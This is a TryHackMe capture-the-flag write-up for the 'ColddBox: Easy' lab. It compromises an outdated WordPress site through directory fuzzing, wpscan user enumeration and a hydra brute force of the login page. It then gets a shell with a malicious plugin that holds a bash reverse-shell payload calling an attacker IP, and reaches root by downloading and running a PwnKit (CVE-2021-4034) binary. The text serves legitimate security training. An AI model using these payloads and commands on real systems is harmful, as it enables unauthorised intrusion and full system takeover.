---
title: 'TryHackMe - ColddBox: Easy'
author: r2cook
categories: [TryHackMe]
tags: [ hydra, wpscan, wordpress, PrivEsc, pkexec, PwnKit]
render_with_liquid: false
media_subpath: /images/thm/ColddBox/
image:
  path: room_card.png
---

> In this write-up, we exploit a vulnerable **WordPress 4.1.31** instance by combining **content discovery, username enumeration, and password brute forcing** to gain administrator access.
> From there, we weaponize the **plugin upload feature** for remote code execution, obtain a shell as `www-data`, and finish the box with a classic **PwnKit (`CVE-2021-4034`) privilege escalation** through `pkexec`.
>
> This room is a great demonstration of how **weak CMS credentials + outdated Linux privilege escalation paths** can quickly lead to full system compromise.

# Initial Setup

First, add the target host entry to `/etc/hosts` so the virtual host resolves correctly:

```plaintext
10.128.175.190 colddbox.thm
```
{: file="/etc/hosts" }

---

# Enumeration

## Full Port Scan

We begin with a full TCP port scan, version detection, and default NSE scripts:

```shell
nmap -p- -sV -sC -Pn --min-rate 1000 -oN nmap_full_scan.txt colddbox.thm
```
{: .nolineno }

## Scan Results

```text
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-30 18:46 EET  
Nmap scan report for colddbox.thm (10.128.175.190)  
Host is up (0.057s latency).  
Not shown: 65533 closed tcp ports (conn-refused)  
PORT     STATE SERVICE VERSION  
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))  
|_http-title: ColddBox | One more machine  
|_http-server-header: Apache/2.4.18 (Ubuntu)  
|_http-generator: WordPress 4.1.31  
4512/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:    
|   2048 4e:bf:98:c0:9b:c5:36:80:8c:96:e8:96:95:65:97:3b (RSA)  
|   256 88:17:f1:a8:44:f7:f8:06:2f:d3:4f:73:32:98:c7:c5 (ECDSA)  
|_  256 f2:fc:6c:75:08:20:b1:b2:51:2d:94:d6:94:d7:51:4f (ED25519)  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 30.76 seconds
```

### Key Findings

- **Port 80 → Apache Web Server**
    
- **Port 4512 → SSH**
    
- The web stack is running **WordPress 4.1.31**, which immediately becomes our main attack surface.
    

---

## Web Portal Enumeration

A quick manual visit to the website confirms a WordPress instance.


![](Image_1.png){: width="800" height="400" .shadow }

![](Image_2.png){: width="800" height="400" .shadow }


Using Wappalyzer also confirms the CMS version as **WordPress 4.1.31**.

---

## Directory Fuzzing

Next, fuzz for hidden directories and backup files:

```shell
ffuf -u http://colddbox.thm/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt -e .php,.txt,.zip,.old,.log -mc 200,204,301,302,307,401,403 -c | tee ffuf_result.txt
```
{: .nolineno }

![](Image_3.png){: width="800" height="400" .shadow }

This reveals an interesting hidden directory: `/hidden`

![](Image_4.png){: width="800" height="400" .shadow }

Inside, we find the following note:

```txt
                                 U-R-G-E-N-T

C0ldd, you changed Hugo's password, when you can send it to him so he can continue uploading his articles. Philip
```

### Important Discovery

This strongly suggests that **`hugo` is a valid WordPress username**.

---

## Login Request Analysis

To prepare for brute forcing, capture a failed login request from `wp-login.php`:

![](Image_5.png){: width="800" height="400" .shadow }

![](Image_6.png){: width="800" height="400" .shadow }

```http
POST /wp-login.php HTTP/1.1
Host: colddbox.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://colddbox.thm/wp-login.php/
Content-Type: application/x-www-form-urlencoded
Content-Length: 70
Origin: http://colddbox.thm
Connection: keep-alive
Cookie: wordpress_test_cookie=WP+Cookie+check
Upgrade-Insecure-Requests: 1
Priority: u=0, i

log=hugo&pwd=&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1
```

---

## WordPress User Enumeration

Use `wpscan` to enumerate users, plugins, and themes:

```shell
wpscan --url http://colddbox.thm -e vp,vt,u
```
{: .nolineno }

![](Image_7.png){: width="800" height="400" .shadow }

Several valid usernames are discovered. Save them into a list:

```shell
cat > wpusers.txt
```
{: .nolineno }

---

## Brute Force WordPress Credentials

Now use `hydra` against the WordPress login form:

```shell
hydra -L wpusers.txt -P /usr/share/wordlists/rockyou.txt \
colddbox.thm http-post-form \
"/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1:S=Location"
```
{: .nolineno }

Successful credentials:

```css
[80][http-post-form] host: colddbox.thm    login: c0ldd    password: 9876543210
```

![](Image_8.png){: width="800" height="400" .shadow }

These credentials grant access to the **WordPress admin panel**, and the compromised account has **administrator privileges**.

![](Image_9.png){: width="800" height="400" .shadow }

---

# Initial Access

With administrator access, the quickest route to RCE is uploading a malicious plugin containing a PHP reverse shell.

## Malicious Plugin

```php
<?php
/**
 * Plugin Name: Wordpress Maint Shell
 * Author: Wordpress
 */

exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.145.29/9001 0>&1'");
?>
```

Zip the plugin file, upload it through:

- **Plugins → Add New → Upload Plugin**
    

Then activate it.

Before activation, start a listener:

```shell
nc -lvnp 9001
```
{: .nolineno }

![](Image_10.png){: width="800" height="400" .shadow }

After activation, we receive a shell as `www-data`.

---

# Privilege Escalation (PrivEsc)

## SUID Enumeration

Search for SUID binaries:

```shell
www-data@ColddBox-Easy:/home/c0ldd$ find / -perm -4000 -type f 2>/dev/null  
/bin/su  
/bin/ping6  
/bin/ping  
/bin/fusermount  
/bin/umount  
/bin/mount  
/usr/bin/chsh  
/usr/bin/gpasswd  
/usr/bin/pkexec  
/usr/bin/find  
/usr/bin/sudo  
/usr/bin/newgidmap  
/usr/bin/newgrp  
/usr/bin/at  
/usr/bin/newuidmap  
/usr/bin/chfn  
/usr/bin/passwd  
/usr/lib/openssh/ssh-keysign  
/usr/lib/snapd/snap-confine  
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic  
/usr/lib/eject/dmcrypt-get-device  
/usr/lib/policykit-1/polkit-agent-helper-1  
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```
{: .nolineno }

The standout binary here is:

- `/usr/bin/pkexec`
    

Check its version:

```shell
www-data@ColddBox-Easy:/home/c0ldd$ /usr/bin/pkexec --version  
pkexec version 0.105
```
{: .nolineno }

This version is vulnerable to **PwnKit (CVE-2021-4034)**.

---

## Exploiting PwnKit

Transfer the exploit binary to the target:

```shell
www-data@ColddBox-Easy:/home/c0ldd$ cd /tmp  
www-data@ColddBox-Easy:/tmp$ wget http://192.168.145.29:8000/PwnKit  
--2026-03-30 20:13:15--  http://192.168.145.29:8000/PwnKit  
Connecting to 192.168.145.29:8000... connected.  
HTTP request sent, awaiting response... 200 OK  
Length: 16800 (16K) [application/octet-stream]  
Saving to: 'PwnKit'  
  
PwnKit                100%[===================>]  16.41K  --.-KB/s    in 0.09s   
  
2026-03-30 20:13:15 (189 KB/s) - 'PwnKit' saved [16800/16800]  
  
www-data@ColddBox-Easy:/tmp$ ls  
PwnKit  
systemd-private-1cce6b038e184056930dc5a32b6535ed-systemd-timesyncd.service-EzcSO3  
www-data@ColddBox-Easy:/tmp$ chmod +x PwnKit   
www-data@ColddBox-Easy:/tmp$ ./PwnKit   
root@ColddBox-Easy:/tmp# id  
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```
{: .nolineno }

Root shell obtained successfully.

![](Image_11.png){: width="800" height="400" .shadow }

---

# Flags

Both `user.txt` and `root.txt` are **Base64-encoded**.

Simply copy the values exactly as shown and submit them directly to TryHackMe.

---